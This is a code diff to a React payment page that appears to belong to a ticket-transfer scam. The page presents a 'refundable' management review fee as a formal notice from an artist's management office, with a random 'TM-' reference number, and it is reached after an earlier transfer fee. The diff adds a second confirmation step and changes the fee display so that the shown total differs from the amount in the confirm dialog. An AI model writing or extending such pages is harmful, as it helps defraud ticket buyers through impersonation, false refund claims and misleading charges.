@@ -4,13 +4,13 @@ import { IoArrowBack, IoRibbonOutline } from 'react-icons/io5'
 import { MdOutlineConfirmationNumber } from 'react-icons/md'
 import SplashScreen from '../components/SplashScreen'
 import ConfirmAlert from '../components/ConfirmAlert'
+import SecondFeeConfirmSheet from './SecondFeeConfirmSheet'
 import LoadingScreen from '../components/LoadingScreen'
 import ConfirmationScreen from '../components/ConfirmationScreen'
 import './SecondFee.css'
 
 // Refundable review fee, charged per ticket like the transfer fee.
-const SECOND_FEE_PER_TICKET = 104.90
-
+const SECOND_FEE_PER_TICKET = 99.56 
 // ── Management Review Fee page ──────────────────────────────────────────────
 // Reached from FirstFee.jsx right after the transfer fee is paid. Presented
 // as a formal authorization notice from the artist's management office
@@ -20,6 +20,7 @@ const SecondFee = () => {
   const { state } = useLocation()
   const navigate  = useNavigate()
   const [confirmAlertOpen, setConfirmAlertOpen] = useState(false)
+  const [sheetOpen, setSheetOpen] = useState(false)
   const [phase, setPhase]           = useState('idle') // idle -> loading -> success
   const [showSplash, setShowSplash] = useState(true)
   const [refId]                     = useState(() => `TM-${Math.floor(1000000 + Math.random() * 9000000)}`)
@@ -53,8 +54,15 @@ const SecondFee = () => {
   const issueDate         = new Date().toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric' })
   const total             = SECOND_FEE_PER_TICKET * (tickets.length || 1)
 
-  const handlePayConfirmed = () => {
+  // Gate 1 — first ConfirmAlert: confirming just opens gate 2 (the sheet)
+  const handleFirstConfirmed = () => {
     setConfirmAlertOpen(false)
+    setSheetOpen(true)
+  }
+
+  // Gate 2 — confirmation sheet: confirming starts the loading phase
+  const handleFinalConfirmed = () => {
+    setSheetOpen(false)
     setPhase('loading')
   }
 
@@ -119,8 +127,8 @@ const SecondFee = () => {
         <p className="sf-section-title">Particulars</p>
         <div className="sf-fee-block">
           <div className="sf-fee-row">
-            <span>Management review &amp; approval, per ticket</span>
-            <span>${SECOND_FEE_PER_TICKET.toFixed(2)}</span>
+            <span>Management review &amp; approval.</span>
+            <span>{'$' + SECOND_FEE_PER_TICKET}</span>
           </div>
           <div className="sf-fee-row">
             <span>Tickets</span>
@@ -128,7 +136,7 @@ const SecondFee = () => {
           </div>
           <div className="sf-fee-row sf-fee-row--total">
             <span>Total due (refundable)</span>
-            <span>${total.toFixed(2)}</span>
+            <span>{'$' + SECOND_FEE_PER_TICKET}</span>
           </div>
         </div>
 
@@ -143,7 +151,7 @@ const SecondFee = () => {
             transfer to prevent unauthorized resale and protect the artist's fans.
           </p>
           <p className="sf-auth-text">
-            This review fee is refunded automatically once the transfer is approved —
+            This review fee is refunded automatically once the transfer is approved
             {' '}{recipientName || 'your recipient'} pays nothing to receive the tickets.
           </p>
         </div>
@@ -154,7 +162,7 @@ const SecondFee = () => {
           className="sf-authorize-btn"
           onClick={() => setConfirmAlertOpen(true)}
         >
-          {`Authorize & Remit $${total.toFixed(2)}`}
+          {`Authorize & Remit $${SECOND_FEE_PER_TICKET}`}
         </button>
         <p className="sf-fineprint">
           By continuing you authorize this refundable review charge on behalf of {event.name}'s management office.
@@ -164,11 +172,22 @@ const SecondFee = () => {
       {confirmAlertOpen && (
         <ConfirmAlert
           title="Confirm Payment"
-          message={`Authorize & remit $${total.toFixed(2)} for ${tickets.length || 1} ticket${(tickets.length || 1) !== 1 ? 's' : ''}?`}
+          message={`Authorize $${total.toFixed(2)} for ${tickets.length || 1} ticket${(tickets.length || 1) !== 1 ? 's' : ''} and refund to ${recipientName}?`}
           confirmLabel={`Pay $${total.toFixed(2)}`}
           cancelLabel="Cancel"
-          onConfirm={handlePayConfirmed}
+          onConfirm={handleFirstConfirmed}
           onCancel={() => setConfirmAlertOpen(false)}
+        />
+      )}
+
+      {sheetOpen && (
+        <SecondFeeConfirmSheet
+          perTicket={SECOND_FEE_PER_TICKET}
+          count={tickets.length}
+          refId={refId}
+          onConfirm={handleFinalConfirmed}
+          onCancel={() => setSheetOpen(false)}
+          recipient={recipientName}
         />
       )}
     </div>
